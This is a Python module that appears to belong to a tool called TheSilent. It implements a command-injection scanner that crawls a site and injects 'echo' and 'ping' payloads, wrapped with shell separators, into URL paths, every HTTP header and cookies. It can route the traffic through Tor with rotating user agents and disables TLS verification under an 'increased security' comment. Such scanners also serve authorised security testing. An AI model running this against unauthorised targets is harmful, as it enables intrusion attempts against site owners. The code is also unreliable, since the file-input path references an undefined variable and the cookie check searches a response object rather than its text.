import time
import urllib.parse
import requests
from TheSilent.clear import clear
from TheSilent.form_scanner import form_scanner
from TheSilent.link_scanner import link_scanner
from TheSilent.return_user_agent import return_user_agent

CYAN = "\033[1;36m"
RED = "\033[1;31m"

# create html sessions object
web_session = requests.Session()

tor_proxy = {
    "http": "socks5h://localhost:9050",
    "https": "socks5h://localhost:9050"}

# increased security
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

# increased security
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

except AttributeError:
    pass

def command_scanner(url, secure=True, tor=False, crawl=0, my_file=" ", parse=" ", delay=1):
    clear()

    client_headers = [
            "A-IM",
            "Accept",
            "Accept-Charset",
            "Accept-Datetime",
            "Accept-Encoding",
            "Accept-Language",
            "Access-Control-Request-Method",
            "Access-Control-Request-Headers",
            "Authorization",
            "Cache-Control",
            "Cookie",
            "Connection",
            "Content-Encoding",
            "Content-Length",
            "Content-MD5",
            "Content-Type",
            "Date",
            "Expect",
            "Forwarded",
            "From",
            "HTTP2-Settings",
            "If-Match",
            "If-Modified-Since",
            "If-None-Match",
            "If-Range",
            "If-Unmodified-Since",
            "Max-Forwards",
            "Origin",
            "Pragma",
            "Prefer",
            "Proxy-Authorization",
            "Range",
            "Referer",
            "TE",
            "Trailer",
            "Transfer-Encoding",
            "Via",
            "Warning"]

    # check for 200 status code
    vuln_list = []

    init_mal_payloads = ["echo thesilent", "ping -c 60 127.0.0.1"]
    mal_payloads = init_mal_payloads[:]

    for mal in init_mal_payloads:
        mal_payloads.append("&" + mal + "&")
        mal_payloads.append("\\" + mal)
        mal_payloads.append("/./" + mal)
        mal_payloads.append("#" + mal)
        mal_payloads.append("\'\'\'" + mal + "\'\'\'")

    init_mal_payloads = mal_payloads[:]
    for mal in init_mal_payloads:
        mal_payloads.append(mal.upper())

    crawler = []

    if my_file == " ":
        og_crawler = link_scanner(url=url, secure=secure, tor=tor, crawl=crawl, parse=parse, delay=delay)

    if my_file != " ":
        with open(my_file, "r", errors="ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                crawler.append(clean)


    crawler = og_crawler[:]

    for crawl in crawler:
        for mal in mal_payloads:
            time.sleep(delay)

            if crawl.endswith("/"):
                my_url = crawl + urllib.parse.quote(mal)

            else:
                my_url = crawl + "/" + urllib.parse.quote(mal)

            # parse url
            print(CYAN + "checking: " + my_url)

            try:
                if tor:
                    start = time.time()
                    result = web_session.get(my_url, verify=False, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(60,120)).text.lower()
                    end = time.time()

                else:
                    start = time.time()
                    result = web_session.get(my_url, verify=False, headers={"User-Agent": return_user_agent()}, timeout=(5,30)).text.lower()
                    end = time.time()

                if "echo" in my_url and "thesilent" in result:
                    print(RED + "True: " + my_url)
                    vuln_list.append(my_url)

                if "ping" in my_url and end - start > 30:
                    print(RED + "True: " + my_url)
                    vuln_list.append(my_url)

            except:
                print(RED + "ERROR! Connection Error! We may be IP banned or the server hasn't recovered! Waiting one minute before retrying!")
                time.sleep(60)

        for mal in mal_payloads:   
            for head in client_headers:
                time.sleep(delay)
                my_headers={"User-Agent": return_user_agent(), head:mal}
                print(CYAN + "checking headers: " + crawl + " " +  str(my_headers))

                try:
                    if tor:
                        start = time.time()
                        result = web_session.get(crawl, verify=False, headers=my_headers, proxies=tor_proxy, timeout=(60,120)).text.lower()
                        end = time.time()

                    else:
                        start = time.time()
                        result = web_session.get(crawl, verify=False, headers=my_headers, timeout=(5,30)).text.lower()
                        end = time.time()

                    if "echo" in str(my_headers) and "thesilent" in result:
                        print(RED + "True headers: " + crawl + " " + str(my_headers))
                        vuln_list.append("headers: " + crawl  + " " + str(my_headers))

                    if "ping" in str(my_headers) and end - start > 30:
                        print(RED + "True headers: " + crawl + " " + str(my_headers))
                        vuln_list.append("headers: " + crawl  + " " + str(my_headers))

                except:
                    print(RED + "ERROR! Connection Error! We may be IP banned or the server hasn't recovered! Waiting one minute before retrying!")
                    time.sleep(60)

        for mal in mal_payloads:   
            time.sleep(delay)
            mal_cookie = {mal: mal}
            print(CYAN + "checking cookies: " + crawl + " " + str(mal_cookie))

            try:
                if tor:
                    start = time.time()
                    result = web_session.get(crawl, verify=False, cookies=mal_cookie, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(60,120))
                    end = time.time()

                else:
                    start = time.time()
                    result = web_session.get(crawl, verify=False, cookies=mal_cookie, headers={"User-Agent": return_user_agent()}, timeout=(5,30))
                    end = time.time()

                if "echo" in str(mal_cookie) and "thesilent" in result:
                    print(RED + "True cookie: " + crawl + " " + str(mal_cookie))
                    vuln_list.append("cookie: " + crawl  + " " + str(mal_cookie))

                if "ping" in str(mal_cookie) and end - start > 30:
                    print(RED + "True cookie: " + crawl + " " + str(mal_cookie))
                    vuln_list.append("cookie: " + crawl  + " " + str(mal_cookie))

            except:
                print(RED + "ERROR! Connection Error! We may be IP banned or the server hasn't recovered! Waiting one minute before retrying!")
                time.sleep(60)

    vuln_list.sort()

    clear()
    
    return vuln_list
